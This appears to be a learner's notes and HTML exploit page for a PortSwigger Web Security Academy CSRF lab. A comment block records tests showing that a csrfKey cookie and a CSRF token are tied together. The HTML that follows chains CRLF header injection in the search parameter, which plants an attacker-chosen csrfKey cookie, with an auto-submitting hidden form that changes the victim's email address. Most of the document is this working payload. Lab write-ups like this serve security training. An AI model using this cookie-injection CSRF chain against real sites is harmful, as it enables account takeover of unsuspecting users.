/*
csrf token and csrfKey cookie are present ...are they tied together?

WE need to test a csrf token and a cookie as well

1) Chekcing if csrf token and cookie are tied together
    invalid tokens ---------- rejected
    valid token from another user ========= rejected

carlos csrf token: XYUcYBhx3CdGHyw0xTdpbqIGBgPyGInV
    so csrfKey cookie and the csrf token are tied together


2) Submit valid csrf token and csrfKey cookie from another user
		carlos csrfKey: "2JNrqvTMhIqUSAYRjkypOsFPKaoxl08c"
        carlos csrf token: XYUcYBhx3CdGHyw0xTdpbqIGBgPyGInV


to exploit we inject an HTTP cookie header with csrfKey
send a requwst with known csrf token

this cookie shows up when we search for haha means we can inject csrfCookie from carlos into wiener's
session using the search functionality
"LastSearchTerm": "haha\r\nSet-Cookie: csrfKey=zwMZY63geACMqnAopozdjykvUJXUf0qv",

our manipulated search term becomes:
haha%0d%0aSet-Cookie:%20csrfKey=2JNrqvTMhIqUSAYRjkypOsFPKaoxl08c
		


*/

<html>
    <body>
        <form action="https://0a8600bc041f9432803fe96400790055.web-security-academy.net/my-account/change-email" method="POST" id="csrf-form">
        <input type="hidden" name="email" value="hackertube@tubeww.net">
        <input type="hidden" name="csrf" value="XYUcYBhx3CdGHyw0xTdpbqIGBgPyGInV">
    </form>
    
    <img src="https://0a8600bc041f9432803fe96400790055.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=2JNrqvTMhIqUSAYRjkypOsFPKaoxl08c%3b%20SameSite=None" onerror="document.forms[0].submit()">

    </body>
</html>